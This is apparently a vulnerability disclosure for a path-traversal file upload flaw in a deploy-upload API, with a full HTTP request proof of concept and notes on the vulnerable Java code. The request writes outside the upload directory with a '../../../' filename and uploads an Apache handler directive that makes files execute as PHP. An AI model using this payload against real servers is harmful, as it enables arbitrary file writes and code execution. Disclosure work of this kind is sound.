# 1. Basic Vulnerability Information

**Affected URL**:   http://localhost:8000/api/deploy/upload

**Affected Parameters:**   filename

**Impact Scope:**   2.7.18

**Vulnerability description：** When uploading a file, first confirm that the file does not exist before uploading. Then, by calling the deletion method of the Java framework, if the file exists, delete it. Finally, perform the upload operation


# 2. Vulnerability reproduction process
If the uploaded file exists, delete it first before uploading

![image](https://github.com/user-attachments/assets/fbac9b69-e45e-4001-a89f-341b105a9d34)

Complete request packet

``` py
POST /api/deploy/upload HTTP/1.1
Host: localhost:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiNUptg1p0qhRY9Yo
Referer: http://localhost:8013/
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiIwZGU0MTE0YTQ0ZGI0ZTMwYTY0YjEzZjRkZDY4MDJlYSIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.WG3uSBAck77-XgeNlV1Y0UHyDVm-Qk2nqtHDrribu0ot7R7bt7YI3QF2g0EVjoefpUFcRqpGGjIC7RIeFz0m-g
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-platform: "Windows"
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Origin: http://localhost:8013
Sec-Fetch-Site: same-site
Content-Length: 1090

------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="app"

[object Object]
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="createBy"

admin
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="createTime"

2025-04-06 16:56:50
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="deploys"

[object Object]
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="id"

2
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="servers"

ww
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="updateBy"

admin
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="updateTime"

2025-04-06 16:56:50
------WebKitFormBoundaryiNUptg1p0qhRY9Yo
Content-Disposition: form-data; name="file"; filename="../../../115.txt"
Content-Type: text/plain

<IfModule mime_module>
SetHandler application/x-httpd-php    
</IfModule>

------WebKitFormBoundaryiNUptg1p0qhRY9Yo--

```


# 3. Vulnerable Code
file.getOriginalFilename(); Receive the original file name for upload  //File deletion tool method

fileSavePath+fileName； Splicing the uploaded files into a path

![image](https://github.com/user-attachments/assets/16f54654-534d-4fa0-8aec-6d4cedd5e988)

FileUtil.del(deployFile); // File deletion tool method

file.transferTo(deployFile); // Upload files received from HTTP requests

Call the framework function to delete duplicate files before uploading


![image](https://github.com/user-attachments/assets/908d70b6-db4f-4cdf-8cd4-0ff0511f8d9a)


# 4. Remediation Suggestions
Defend against multiple levels of input verification, standardized storage, user permissions, and operational control
